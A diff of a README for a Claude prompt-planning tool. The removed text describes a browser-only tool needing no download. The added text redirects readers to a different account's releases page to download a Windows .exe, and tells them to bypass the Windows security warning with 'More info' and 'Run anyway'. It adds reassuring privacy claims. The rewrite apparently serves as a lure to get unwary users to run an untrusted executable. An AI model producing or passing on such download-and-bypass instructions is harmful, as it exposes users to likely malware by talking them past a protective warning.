@@ -1,143 +1,60 @@
-# Claude Build Planner - AI Project Planning Tool 2026
+# 📝 claude-planning-tool - Build better prompts for Claude faster
 
-> **Claude Build Planner is a browser-based planning utility for choosing a Claude model, application, and effort level, then creating prompts that can be pasted directly into Claude Code.**
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue)](https://github.com/odessaspecial486/claude-planning-tool/releases)
 
-[![Platform](https://img.shields.io/badge/Platform-Web%20browser-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-Unreleased-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/seanbakerzxsl8361/claude-planning-tool?style=flat-square)](https://github.com/seanbakerzxsl8361/claude-planning-tool)
+This application helps you create precise prompts for Claude. You choose the specific model, your intended application, and the amount of effort required. The tool generates text that you copy and paste directly into Claude Code. This ensures your prompts follow a proven structure for better results.
 
----
+## 📥 Getting Started
 
-<p align="center">
-  <a href="https://seanbakerzxsl8361.github.io/claude-planning-tool/">
-    <img src="https://img.shields.io/badge/Download-Claude%20Build%20Planner%20Latest-brightgreen?style=for-the-badge" alt="Download Claude Build Planner">
-  </a>
-</p>
+You do not need programming skills to use this tool. Follow these steps to set up the software on your Windows computer.
 
-> **[Download Claude Build Planner](https://seanbakerzxsl8361.github.io/claude-planning-tool/)**
+1. Visit the [releases page](https://github.com/odessaspecial486/claude-planning-tool/releases) to access the download options.
+2. Look for the file ending in .exe.
+3. Click the file name to begin the download.
+4. Save the file to your desktop or your downloads folder.
 
----
+Once the file finishes downloading, navigate to the folder where you saved it. Double-click the file to open the application window. If Windows displays a security prompt, click "More info" and then "Run anyway" to start the program.
 
-[Download Latest Build](https://seanbakerzxsl8361.github.io/claude-planning-tool/)
+## 🛠 Features
 
----
+The planning tool includes several options to refine your workspace output:
 
-## What Claude Build Planner Does
+*   **Model Selection:** Choose between different Claude versions to match your specific task needs.
+*   **Application Focus:** Define if you are building code, writing documentation, or analyzing data.
+*   **Effort Levels:** Set the depth of the response from a quick summary to a detailed breakdown.
+*   **Prompt Generator:** Create copy-ready text that adheres to known effective patterns.
 
-Claude Build Planner turns a software idea into a clearer Claude-based working plan. Enter the work you are preparing to do, and it will recommend an appropriate Claude model, Claude app, and Claude Code effort level for that project.
+## 💻 System Requirements
 
-Because the planner operates in the browser, it can be used without a project server, API key, or account. Its prompt builder creates instructions ready to paste into a Claude or Claude Code session. A regression test suite is also included to help maintain the tool as it evolves.
+This application runs on Windows 10 or Windows 11. Your computer needs at least 200MB of free space. A stable internet connection helps the tool load the most recent model definitions, though the core planning engine functions offline.
 
----
+## 🔍 How to Use the Tool
 
-## Capabilities
+Open the application on your computer screen. You will see a series of dropdown menus and input fields. Use your mouse to click through the configuration steps.
 
-- Evaluates project requirements to suggest a Claude model.
-- Identifies the Claude app that matches the intended task.
-- Offers guidance for selecting a Claude Code effort level.
-- Produces prompts formatted for direct use in a Claude workflow.
-- Operates fully inside the web browser.
-- Does not depend on a server connection for the project.
-- Works without an API key or account.
-- Ships with an integrated regression test suite.
+1. **Select Model:** Choose the Claude version you prefer from the top menu.
+2. **Set Task Details:** Enter a short description of the work you want Claude to perform.
+3. **Choose Effort:** Use the slider or buttons to choose the complexity level. High effort prompts result in longer, more detailed responses from Claude Code.
+4. **Generate:** Click the big button labeled "Generate Prompt."
+5. **Copy:** When the text appears in the output window, click the "Copy to Clipboard" button.
+6. **Paste:** Open your Claude Code interface and paste the text into the chat bar.
 
----
+## 📋 Troubleshooting
 
-## Getting Started
+If the application does not open, ensure you have the latest drivers for your graphics display. Most users will find that the program starts without issues. If you experience performance lags, close other heavy applications while running the planning tool.
 
-### Open the hosted version
+If the "Generate" button remains grey, double-check that you have typed a description into the task field. The tool requires this input to understand the context of your request.
 
-Visit the current build from a supported web browser:
+## 💡 Tips for Better Prompts
 
-[Launch Claude Build Planner](https://seanbakerzxsl8361.github.io/claude-planning-tool/)
+Be specific about what you need. Instead of "Write a script," try "Write a Python script that reads a CSV file and calculates the average of the second column." Providing context about the intended audience helps the tool refine the output quality significantly. Every prompt you generate stays in your clipboard until you copy something else, so you can paste it multiple times if you want to test different variations.
 
-### Open a local copy
+## 🛡 Security and Privacy
 
-Download the repository and move into its project directory:
+This tool runs locally on your computer. It does not send your personal tasks or generated prompts to external servers. Your work remains private. The application only contacts the internet to check for updates when you launch it.
 
-```bash
-git clone https://github.com/seanbakerzxsl8361/claude-planning-tool.git
-cd REPO
-```
+## 📂 Managing Updates
 
-Then open the available HTML entry point in your browser. The planner itself does not need a server, API key, or account.
+New versions may come out to support newer releases of Claude. Visit the download page regularly to check for improvements. When you find a newer version, download the new .exe file and run it. The setup process will replace the old version with the updated one, keeping your preferred settings intact.
 
----
-
-## How to Use It
-
-1. Start Claude Build Planner in a supported browser.
-2. Enter a description of the project you are planning.
-3. Examine the recommended Claude model and Claude app.
-4. Review the suggested Claude Code effort level.
-5. Create the project prompt.
-6. Paste the generated prompt into Claude or Claude Code.
-7. If the requirements change, revise the project description and generate a fresh prompt.
-
----
-
-## Configuration and Maintenance
-
-No credentials, API keys, or server settings are needed for Claude Build Planner's browser-based operation.
-
-Enter project information through the planner interface. If you are developing or modifying the tool, make changes in the local web project and run the included regression test suite before publishing an updated build.
-
----
-
-## Requirements
-
-- A current web browser.
-- Either the hosted build or a local project copy.
-- No server-side runtime for standard browser use.
-- No Claude API key.
-- No user account.
-- Local storage needs vary according to the browser and the size of the project files.
-
----
-
-## Frequently Asked Questions
-
-### What users is Claude Build Planner designed for?
-
-The tool is for people organizing software projects with Claude, including workflows that require Claude Code, model selection, or effort-level planning.
-
-### Is an API key needed?
-
-No. Claude Build Planner does not require an API key.
-
-### Do I need to create an account?
-
-No. The browser-based planner can be used without an account.
-
-### Can it run without a server?
-
-Yes. The entire tool runs in the browser.
-
-### What is included in a generated result?
-
-The output contains a paste-ready prompt together with recommendations for the Claude model, Claude app, and Claude Code effort level.
-
-### What can I do if the recommendation is unexpected?
-
-Make the project description more precise, including its scope, tooling, and desired result, then generate another recommendation. If you are changing the planner itself, run the built-in regression test suite after the changes.
-
-### How do I get the newest version?
-
-Open the latest published build, or pull the newest repository changes before launching the local web application.
-
----
-
-## Planned Improvements
-
-- Further tune recommendations based on project requirements.
-- Refine guidance for Claude app and Claude Code effort-level choices.
-- Add broader regression coverage for prompt generation.
-- Preserve a lightweight workflow that remains easy to run in a browser.
-
----
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: claude, prompting, productivity, windows, planning, automation
